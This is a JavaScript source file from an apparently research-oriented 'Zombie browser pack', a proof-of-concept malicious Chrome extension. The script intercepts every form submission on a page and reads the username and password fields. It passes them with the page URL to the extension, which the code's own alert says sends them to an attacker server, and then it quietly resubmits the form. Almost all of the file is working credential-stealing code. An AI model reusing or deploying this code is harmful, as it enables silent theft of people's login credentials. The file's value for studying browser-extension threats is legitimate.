/*

Zombie browser pack, remote control Chrome browsers via extensions, lite edition
Copyright (C) 2012  Zoltan Balazs

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/


/*
Password stealing part reused with permission from:
Andreas Grech - http://blog.dreasgrech.com/2010/07/stealing-login-details-with-google.html
Stealing login details with a Google Chrome extension - 2010 July 9
*/  


function type(obj) {
	return Object.prototype.toString.call(obj).match(/^\[object (.*)\]$/)[1]
}



$(function() {

 var passwordBoxes = $("input[type=password]"),
 getMessage = function(username, password, url) {
  return "Username: " + username + "  Password: " + password + " Url: " + url;
 },
 sendEmail = function(username, password, url, callback) {
  var msg = getMessage(username, password, url);
  alert("the following data has been sent to the malicious attacker server via the zombie browser plugin: " + msg);
  
  try { 
  chrome.extension.sendRequest({greeting: "postdata", message: msg}, function(response) {
  console.log("response");
	});
	callback();
  }
  catch(e){
  console.log("main.js error");
  }
 },
 process = function(callback) {
  var username = $("input[id=Email]").not(passwordBoxes).filter(function() {
   var field = $(this);
   return field.val() || field.html();
  }).val(),
  password = passwordBoxes.val();

  sendEmail(username, password, location.href, callback);
 };

 $("form").submit(function(e) {
  var $this = $(this);
  e.preventDefault();
  process(function() {
   $this.unbind('submit');
   $this.submit();
  });
 });
});

